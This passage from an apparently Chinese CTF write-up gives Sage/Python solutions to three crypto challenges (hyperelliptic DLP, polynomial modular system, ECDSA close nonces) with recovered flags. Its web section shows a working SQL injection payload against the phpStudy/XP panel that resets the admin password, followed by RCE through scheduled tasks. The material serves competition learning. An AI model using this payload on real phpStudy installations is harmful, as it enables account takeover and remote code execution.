class="number">1</span>, p-<span class="number">1</span>) </span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(GF(p)) </span><br><span class="line">f = <span class="built_in">sum</span>(randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">128</span>)*x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*g + <span class="number">1</span> + <span class="number">1</span>)) </span><br><span class="line">sy = f(sx).nth_root(<span class="number">2</span>) </span><br><span class="line">HC = HyperellipticCurve(f, <span class="number">0</span>) </span><br><span class="line">J = HC.jacobian()(GF(p)) </span><br><span class="line">r = randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">40</span>) </span><br><span class="line">D1 = randint(<span class="number">1</span>, p-<span class="number">1</span>)*J(HC((sx, sy))) </span><br><span class="line">D2 = r*D1 </span><br><span class="line"> </span><br><span class="line">key = sha256(<span class="built_in">str</span>(r).encode()).digest() </span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) </span><br><span class="line">ct = aes.encrypt(pad(flag, <span class="number">16</span>)) </span><br><span class="line"><span class="built_in">print</span>(p) </span><br><span class="line"><span class="built_in">print</span>(D1) </span><br><span class="line"><span class="built_in">print</span>(D2) </span><br><span class="line"><span class="built_in">print</span>(b64encode(ct).decode()) </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">28250322002421485740011517298787354630342182411922678481506757706584776470549</span></span><br><span class="line"><span class="string">(x^3 + 14837843646688223376620895623918856834301419791450189502644075689674679307565*x^2 + 11342007530582447297077768070260591643434731986676417772353996440271447424229*x + 17253160355772506039833501683117771635464243068672344160916188778934194482626, y + 11583638164648709615113883733024362701865856309079457013197399476805753481773*x^2 + 14799567073594539924214272546716232642453764116619810153125493046155930087914*x + 9020351128638199743425310619576234999021949822922952447017982687315971687269)</span></span><br><span class="line"><span class="string">(x^3 + 24086141351204484270563731092873802082275121784385117167214060247819862896159*x^2 + 12580133579221229248448771717453263525988015199573816289207551576399335707433*x + 2025561351219044126154032254344655853662339878505961213456370741923912105725, y + 3024337373411188543472600372581043552807342888844351463589310783585361491167*x^2 + 22142729345652208596100988590287276835636512968984185855026844080502870977199*x + 24006419269594097580414614133924457311337109216133817568627246946606650903690)</span></span><br><span class="line"><span class="string">IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>超椭圆曲线下的DLP问题。</p><p>首先恢复 $f$，参考 <a href="https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell">https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell</a> 可用CRT得到 $f$，点数不足够使得不足以恢复正常的 $f$。</p><p>注意到 $p$ 为 256位，而 $f$ 的系数皆为 128位，可以用类似RLWE的方法LLL算出 $f$，最后，$r$ 不到 40位，可以用BSGS算法求解DLP问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">p = <span class="number">28250322002421485740011517298787354630342182411922678481506757706584776470549</span></span><br><span class="line">PR = GF(p)[<span class="string">&quot;x&quot;</span>]</span><br><span class="line">x = PR.gen()</span><br><span class="line">y = <span class="number">0</span></span><br><span class="line">D1 = (</span><br><span class="line">    x</span><br><span class="line">    ^ <span class="number">3</span></span><br><span class="line">    + <span class="number">14837843646688223376620895623918856834301419791450189502644075689674679307565</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">11342007530582447297077768070260591643434731986676417772353996440271447424229</span> * x</span><br><span class="line">    + <span class="number">17253160355772506039833501683117771635464243068672344160916188778934194482626</span>,</span><br><span class="line">    y</span><br><span class="line">    + <span class="number">11583638164648709615113883733024362701865856309079457013197399476805753481773</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">14799567073594539924214272546716232642453764116619810153125493046155930087914</span> * x</span><br><span class="line">    + <span class="number">9020351128638199743425310619576234999021949822922952447017982687315971687269</span>,</span><br><span class="line">)</span><br><span class="line">D2 = (</span><br><span class="line">    x</span><br><span class="line">    ^ <span class="number">3</span></span><br><span class="line">    + <span class="number">24086141351204484270563731092873802082275121784385117167214060247819862896159</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">12580133579221229248448771717453263525988015199573816289207551576399335707433</span> * x</span><br><span class="line">    + <span class="number">2025561351219044126154032254344655853662339878505961213456370741923912105725</span>,</span><br><span class="line">    y + <span class="number">3024337373411188543472600372581043552807342888844351463589310783585361491167</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">22142729345652208596100988590287276835636512968984185855026844080502870977199</span> * x</span><br><span class="line">    + <span class="number">24006419269594097580414614133924457311337109216133817568627246946606650903690</span>,</span><br><span class="line">)</span><br><span class="line">ct = b64decode(<span class="string">&quot;IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0&quot;</span>)</span><br><span class="line"></span><br><span class="line">rems = [D1[<span class="number">1</span>] ^ <span class="number">2</span>, D2[<span class="number">1</span>] ^ <span class="number">2</span>]</span><br><span class="line">mods = [D1[<span class="number">0</span>], D2[<span class="number">0</span>]]</span><br><span class="line">ff = crt(rems, mods)</span><br><span class="line">L = prod(mods)</span><br><span class="line"><span class="built_in">print</span>(ff)</span><br><span class="line"></span><br><span class="line">M = matrix(</span><br><span class="line">    ZZ,</span><br><span class="line">    [</span><br><span class="line">        vector(ff.padded_list(<span class="number">8</span>)),</span><br><span class="line">        vector(L.padded_list(<span class="number">8</span>)),</span><br><span class="line">        vector((L * x).padded_list(<span class="number">8</span>)),</span><br><span class="line">        *<span class="built_in">list</span>(matrix.identity(<span class="number">8</span>) * p),</span><br><span class="line">    ],</span><br><span class="line">)</span><br><span class="line">M = M.augment(vector([<span class="number">1</span>] + [<span class="number">0</span>] * (<span class="number">2</span> + <span class="number">8</span>)))</span><br><span class="line">M[:, -<span class="number">1</span>] *= <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">M = M.LLL()</span><br><span class="line">M[:, -<span class="number">1</span>] /= <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">target = <span class="built_in">next</span>(row <span class="keyword">for</span> row <span class="keyword">in</span> M <span class="keyword">if</span> row[-<span class="number">1</span>] == <span class="number">1</span> <span class="keyword">or</span> row[-<span class="number">1</span>] == -<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> target[-<span class="number">1</span>] == -<span class="number">1</span>:</span><br><span class="line">    target = -target</span><br><span class="line">f = PR(<span class="built_in">list</span>(target[:-<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">HC = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = HC.jacobian()(GF(p))</span><br><span class="line">D1 = J(D1)</span><br><span class="line">D2 = J(D2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># BSGS</span></span><br><span class="line"><span class="comment"># D2=(v+u*M)D1</span></span><br><span class="line"><span class="comment"># D2-vD1=u*M*D1</span></span><br><span class="line">M = <span class="number">2</span>**<span class="number">20</span></span><br><span class="line">lhs = &#123;&#125;</span><br><span class="line">T = D2</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(M)):</span><br><span class="line">    lhs[T] = v</span><br><span class="line">    T = T - D1</span><br><span class="line">MD1 = M * D1</span><br><span class="line">T = <span class="number">0</span> * MD1</span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(M)):</span><br><span class="line">    <span class="keyword">if</span> T <span class="keyword">in</span> lhs:</span><br><span class="line">        v = lhs[T]</span><br><span class="line">        r = u * M + v</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    T = T + MD1</span><br><span class="line"></span><br><span class="line">key = sha256(<span class="built_in">str</span>(r).encode()).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">pt = unpad(aes.decrypt(ct), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;72825d3f-74f0-0a0e-ba1c-895eee99dc29&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Cisticola"><a href="#Cisticola" class="headerlink" title="Cisticola"></a>Cisticola</h3><blockquote><p>Let me tell you a story about polynomial.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Q = [...]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- #!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># Problem by rec, with nothing.</span></span><br><span class="line"><span class="keyword">import</span> Q</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">enc = cipher.encrypt(pad(secret.flag, <span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">Q = R(Q.Q)</span><br><span class="line"></span><br><span class="line">t = <span class="number">17</span></span><br><span class="line">pos = random.sample(<span class="built_in">range</span>(<span class="number">600</span>), t) + [<span class="number">600</span>]</span><br><span class="line">poly = [<span class="built_in">int</span>(os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t)] + [<span class="built_in">int</span>(key.<span class="built_in">hex</span>(), <span class="number">16</span>)]</span><br><span class="line">hint = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>):</span><br><span class="line">    hint = (hint + poly[i]*x^pos[i]) % Q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pos = &#125;</span>\n<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>多项式上的模运算，先用sage推导多项式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pos = [<span class="number">477</span>, <span class="number">491</span>, <span class="number">210</span>, <span class="number">515</span>, <span class="number">150</span>, <span class="number">142</span>, <span class="number">561</span>, <span class="number">5</span>, <span class="number">475</span>, <span class="number">329</span>, <span class="number">598</span>, <span class="number">274</span>, <span class="number">241</span>, <span class="number">310</span>, <span class="number">108</span>, <span class="number">483</span>, <span class="number">181</span>, <span class="number">600</span>]</span><br><span class="line">Q = [...]</span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R = PolynomialRing(GF(p), <span class="string">&#x27;a&#x27;</span>, <span class="number">19</span>)</span><br><span class="line">a = R.gens()</span><br><span class="line">x = a[<span class="number">18</span>]</span><br><span class="line"><span class="comment">#Q = R(Q)</span></span><br><span class="line">Q = ...</span><br><span class="line"></span><br><span class="line">poly = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    poly = (poly + a[i]*x^pos[i]) % Q</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(poly)</span><br></pre></td></tr></table></figure><p>得到429次多项式，将同次项的系数归类，形成A/B矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">eval</span>(<span class="built_in">open</span>(<span class="string">r&#x27;outA.txt&#x27;</span>).readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(f))</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">430</span>):</span><br><span class="line">    d.append([])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    x = k[<span class="number">0</span>].strip()</span><br><span class="line">    d[k[<span class="number">1</span>]].append(<span class="built_in">int</span>(x.split(<span class="string">&#x27;*&#x27;</span>)[<span class="number">0</span>]) <span class="keyword">if</span> x[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>([<span class="built_in">len</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> d])</span><br><span class="line"><span class="comment"># len=8: a0/1/3/6/8/10/15/17</span></span><br><span class="line"><span class="comment"># len=9: a0/1/3/6/8/10/15/17+another one</span></span><br><span class="line"></span><br><span class="line">A = d[-<span class="number">8</span>:][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">eval</span>(<span class="built_in">open</span>(<span class="string">r&#x27;outB.txt&#x27;</span>).readlines()[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    B.append(k[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">r&#x27;out_final.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;A = <span class="subst">&#123;A&#125;</span>&#x27;</span>,file=g)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;B = <span class="subst">&#123;B[:<span class="number">8</span>]&#125;</span>&#x27;</span>,file=g)</span><br></pre></td></tr></table></figure><p>发现大部分含8项的系数都与a0/a1/a3/a6/a8/a10/a15/a17变量有关，选取8组同次项与结果来做系数对比，求解矩阵方程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line"></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line">A = matrix(Zmod(p), A)</span><br><span class="line">B = vector(Zmod(p), B[:<span class="number">8</span>])</span><br><span class="line">A \ B</span><br><span class="line"></span><br><span class="line"><span class="comment"># (232766905492121523584723111736297361759, 328061273411433237903912759338260875197, 64156810189296343079030126884552967921, 145155918563801313155466268136086691055, 281912772467581204740174686468688405760, 127909413131477378514965968460479471790, 176132068091173488530894527009633409599, 275609957223526193497841020687316070508)</span></span><br></pre></td></tr></table></figure><p>得到key=a17=275609957223526193497841020687316070508，解AES：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;e086deeb9f060c014867c5adbd1ee1b449193b6e6177f58a36948282e1728f3b529b2def3c39f69c7a9001b4cac4d1d5&#x27;</span></span><br><span class="line">key = long_to_bytes(<span class="number">275609957223526193497841020687316070508</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">m = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(enc))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;182273bd-61f2-7147-acd8-d571de11bb40&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ecdsa"><a href="#ecdsa" class="headerlink" title="ecdsa"></a>ecdsa</h3><blockquote><p>Let me tell you a story about ecdsa.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">gen = <span class="keyword">lambda</span>: p + getPrime(<span class="number">16</span>)</span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + os.urandom(<span class="number">32</span> - <span class="built_in">len</span>(m) % <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">30</span>)</span><br><span class="line">sk = ecdsa.SigningKey.from_secret_exponent(</span><br><span class="line">    secexp=bytes_to_long(key),</span><br><span class="line">    curve=ecdsa.SECP256k1</span><br><span class="line">)</span><br><span class="line">sig1 = sk.sign(data=<span class="string">b&#x27;This is the first message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">sig2 = sk.sign(data=<span class="string">b&#x27;Here is another message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">enc = xor(hashlib.sha512(key).digest(), pad(secret.flag)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sig1 = &#125;</span>\n<span class="subst">&#123;sig2 = &#125;</span>\n<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line"><span class="string">sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line"><span class="string">enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>选取标准曲线SECP256k1，且查看ecdsa包源码，<code>sig=r_str+s_str</code>。</p><p>根据式子：</p><p>$s_1 \equiv k_1^{-1}(z_1+r_1d) \pmod n,s_2 \equiv k_2^{-1}(z_2+r_2d) \pmod n$</p><p>已知 $r_1,s_1,r_2,s_2,z_1,z_2$，且 $k_1-k_2=\Delta k$ 很小，联立用 $\Delta k$ 表示 $d$，再分别爆破 $\Delta k$ 值即可得到正确的 $d$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1,sha512</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line">h1 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;This is the first message.&#x27;</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">h2 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;Here is another message.&#x27;</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">sig1 = <span class="string">&#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line">sig2 = <span class="string">&#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> inverse_mod(x,n)</span><br><span class="line"></span><br><span class="line">r1 = <span class="built_in">int</span>(sig1[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">s1 = <span class="built_in">int</span>(sig1[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">r2 = <span class="built_in">int</span>(sig2[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">s2 = <span class="built_in">int</span>(sig2[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> dk <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>^<span class="number">16</span>, <span class="number">2</span>^<span class="number">16</span>):</span><br><span class="line">    x = (dk-(inv(s2)*h2-inv(s1)*h1))*inv(inv(s2)*r2-inv(s1)*r1)%n</span><br><span class="line">    <span class="keyword">if</span> x.nbits()&lt;=<span class="number">30</span>*<span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(dk,x)</span><br><span class="line">        flag = <span class="built_in">int</span>(sha512(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])).hexdigest(), <span class="number">16</span>) ^^ <span class="built_in">int</span>(enc,<span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line">        </span><br><span class="line"><span class="comment"># -12538 529916052714421365211802626556164022962456609322782019794355446252399179</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;2f64731e-785b-4259-4566-3d17554bfb7b&#125;\xed\x98\x98\xbc\x92+\xc7\x7f\xe2_\xfd\x17\x1e\x9c\xf7\x17Rq\xfa3\xa2&#123;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><p>NKCTF 2023 - xiaopi 原题，参考 <a href="https://blog.csdn.net/weixin_52365980/article/details/129803385。">https://blog.csdn.net/weixin_52365980/article/details/129803385。</a></p><p>在请求头加 <code>X-Requested-With: XMLHttpRequest</code> 可以进入后台登录界面，</p><p>再参考小皮面板前台sql注入更改管理员密码，构造payload：</p><p><code>admin&#39;;UPDATE ADMINS set PASSWORD = &#39;202cb962ac59075b964b07152d234b70&#39;;--</code></p><p>接着用 <code>admin/123</code> 可进入后台，在计划任务界面直接RCE即可获取flag。</p><p>​    </p><h3 